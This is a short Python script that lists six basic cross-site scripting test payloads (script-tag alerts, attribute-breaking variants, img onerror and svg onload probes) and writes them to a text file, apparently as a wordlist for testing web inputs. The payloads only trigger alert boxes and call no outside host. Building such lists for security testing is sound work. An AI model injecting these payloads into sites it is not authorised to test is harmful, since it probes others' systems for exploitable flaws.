xss_payloads = [
    '<script>alert("XSS")</script>',
    '"><script>alert(1)</script>',
    '\'><script>alert(1)</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg/onload=prompt(1)>',
    '<marquee><h1>XSS</h1></marquee>',
]

# Write the payloads to a text file
with open('xss_payloads.txt', 'w') as f:
    for payload in xss_payloads:
        f.write(payload + '\n')
